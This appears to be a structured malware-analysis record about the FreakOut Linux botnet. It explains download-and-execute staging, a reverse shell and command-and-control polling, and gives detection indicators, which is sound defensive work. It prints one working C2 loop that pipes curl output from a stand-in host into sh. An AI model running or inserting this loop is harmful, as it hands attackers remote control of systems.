package_info.why_malicious: FreakOut is a new malware variant that exploits vulnerabilities on Linux devices to infect them, incorporate them into a botnet, and use them for DDoS attacks and crypto-mining. The malware executes unauthorized code, establishes persistence, and enables remote control, all of which are clear indicators of malicious intent.

execution_context.trigger: runtime (after successful exploitation of a Linux vulnerability)
execution_context.file_location: dropped malware binary or script on compromised Linux device

malicious_snippets.code_behavior: At runtime, the code downloads a remote shell script from a malicious domain, saves it to /tmp, makes it executable, and executes it, resulting in the installation of the malware and further compromise of the system.

malice_analysis.why_suspicious: This behavior is suspicious because it involves downloading and executing code from an untrusted remote source, a common technique for initial malware deployment.
malice_analysis.violated_expectations: Normal Linux processes do not download and execute remote scripts without user interaction or legitimate update mechanisms.
malice_analysis.similar_legitimate_use: Automated update scripts for legitimate software may download and execute updates, but only from trusted sources and with user/admin consent.
key_indicators: Download of executable code from external domain
Use of /tmp directory for staging malware

malicious_snippets.code_behavior: At runtime, the code establishes a reverse shell connection to a remote attacker-controlled server, redirecting input/output to the attacker's system, enabling remote command execution.

malice_analysis.why_suspicious: Reverse shells are a classic method for attackers to gain remote control over compromised systems, bypassing firewalls and monitoring.
malice_analysis.violated_expectations: Legitimate software should not open outbound connections to arbitrary remote servers and provide shell access.
malice_analysis.similar_legitimate_use: Remote administration tools may use similar techniques, but only with explicit user consent and to trusted endpoints.
key_indicators: Duplication of file descriptors for shell access

malicious_snippets.code_snippet: while true; do curl http://command-and-control.com/task | sh; sleep 60; done
malicious_snippets.code_behavior: At runtime, the code repeatedly contacts a command-and-control server, downloads task instructions, and executes them as shell commands, enabling remote control and dynamic tasking.

malice_analysis.why_suspicious: Continuous polling of a remote server for executable instructions is a hallmark of botnet malware, enabling attackers to issue arbitrary commands.
malice_analysis.violated_expectations: Normal software does not execute arbitrary code fetched from the internet in an infinite loop.
malice_analysis.similar_legitimate_use: Automated update agents may poll for updates, but do not execute arbitrary shell commands from untrusted sources.
key_indicators: Infinite loop fetching and executing remote code
Use of curl and shell piping

behavioral_signatures: Unusual outbound connections to known malicious domains or IPs
Download and execution of remote scripts or binaries
Frequent polling of external command-and-control servers
Execution of arbitrary shell commands received from the network
file_indicators: Unexpected executable scripts or binaries in /tmp or other writable directories
Persistence mechanisms added by unknown scripts
network_indicators: Connections to attacker-controlled domains (e.g., attacker.com, command-and-control.com)
Frequent HTTP requests to external servers for tasking
detection_knowledge.how_to_detect: Monitor for processes that download and execute scripts from the internet, especially in writable directories like /tmp. Detect outbound connections to known C2 domains or IPs, and flag reverse shell patterns (e.g., duplication of file descriptors to remote sockets). Watch for processes that repeatedly fetch and execute code from external sources. Use file integrity monitoring to detect new or modified executables in sensitive locations.
